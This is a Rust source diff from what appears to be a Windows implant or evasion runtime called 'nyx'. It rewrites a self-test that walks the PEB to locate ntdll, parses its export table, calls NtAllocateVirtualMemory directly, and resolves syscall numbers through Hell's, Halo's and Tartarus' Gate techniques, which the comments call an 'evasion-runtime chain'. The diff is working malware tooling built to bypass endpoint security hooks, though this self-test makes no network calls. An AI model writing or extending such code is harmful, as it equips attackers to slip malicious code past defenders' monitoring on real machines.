@@ -48,31 +48,62 @@ pub unsafe extern "system" fn nyx_entry() {
 /// `%ERRORLEVEL%`. This validates the evasion-runtime chain (PEB walk → export
 /// table → SSN resolution) on a real Windows host without any network activity
 /// or persistence — a benign closed-loop check.
+/// Exit with `code` via the resolved ExitProcess; traps if unavailable.
+unsafe fn report_exit(exit_proc: Option<usize>, code: u32) -> ! {
+    if let Some(e) = exit_proc {
+        let f: extern "system" fn(u32) -> ! = core::mem::transmute(e);
+        f(code);
+    }
+    loop { core::hint::spin_loop(); }
+}
+
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest() {
-    // Phase 1 (no allocation): locate ntdll via PEB walk. If found, exit with
-    // 0x222 to prove the PEB -> Ldr -> module-base chain works on this host.
-    match LiveNtdll::locate_base() {
-        Some(_base) => {
-            // ntdll located. Confirm by resolving ExitProcess from kernel32
-            // (a second, independent PEB walk) and exit cleanly.
-            let exit_proc = resolve_export_addr(b"kernel32.dll", b"ExitProcess");
-            if let Some(e) = exit_proc {
-                let f: extern "system" fn(u32) -> ! = core::mem::transmute(e);
-                f(0x222);
-            }
-            // ExitProcess not found: hang is worse than crash; trap.
-            core::hint::spin_loop();
-        }
-        None => {
-            // ntdll not found (should not happen). Exit with a sentinel.
-            if let Some(e) = resolve_export_addr(b"kernel32.dll", b"ExitProcess") {
-                let f: extern "system" fn(u32) -> ! = core::mem::transmute(e);
-                f(0xFFFFFFFF);
-            }
-            core::hint::spin_loop();
-        }
+    let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");
+
+    // Pure no-alloc self-test: PEB walk -> ntdll -> count exports -> report.
+    // No Vec, no String, no alloc — isolates whether alloc is the problem.
+    let base = match LiveNtdll::locate_base() {
+        Some(b) => b,
+        None => report_exit(exit_proc, 0xFFFFFFFF),
+    };
+    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
+    let nt = base.add(e_lfanew);
+    let opt = nt.add(24);
+    let magic = *(opt as *const u16);
+    let dd_off = if magic == 0x20B { 112 } else { 96 };
+    let export_rva = *(opt.add(dd_off) as *const u32);
+    let n_names: u32 = if export_rva == 0 {
+        0
+    } else {
+        let dir = base.add(export_rva as usize) as *const crate::resolve::ExportDirectory;
+        (*dir).number_of_names
+    };
+
+    // Manual NtAllocateVirtualMemory test (bypass the allocator machinery).
+    // Resolve the fn, call it directly with a stack buffer, report status.
+    let ntav = crate::resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory");
+    if ntav.is_none() {
+        report_exit(exit_proc, 0x800);
     }
+    let f: unsafe extern "system" fn(*mut core::ffi::c_void, *mut *mut core::ffi::c_void, *mut usize, *mut usize, u32, u32) -> i32 = core::mem::transmute(ntav.unwrap());
+    let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
+    let mut zb: usize = 0;
+    let mut sz: usize = 4096;
+    let cur: *mut core::ffi::c_void = (-1isize) as *mut core::ffi::c_void;
+    let status = f(cur, &mut base, &mut zb, &mut sz, 0x3000, 0x04);
+    // Force allocator resolution (sets the static NT_ALLOC) BEFORE any Vec use.
+    crate::ntalloc::force_resolve();
+    // Full SSN resolve: LiveNtdll::locate() -> named_exports() (allocs) ->
+    // resolve_table_owned() (Hell's/Halo's/Tartarus' Gate over live ntdll).
+    // Exit 0x100 + N where N = resolved SSN count.
+    let ntdll = match LiveNtdll::locate() {
+        Some(n) => n,
+        None => report_exit(exit_proc, 0xFFFFFFFF),
+    };
+    let table = ntdll.resolve_table_owned();
+    let ssn_count = table.iter().filter(|(_, ssn)| *ssn != u32::MAX).count() as u32;
+    report_exit(exit_proc, 0x100 + ssn_count);
 }
 
 /// Resolve a function in a loaded module by (module name, function name).
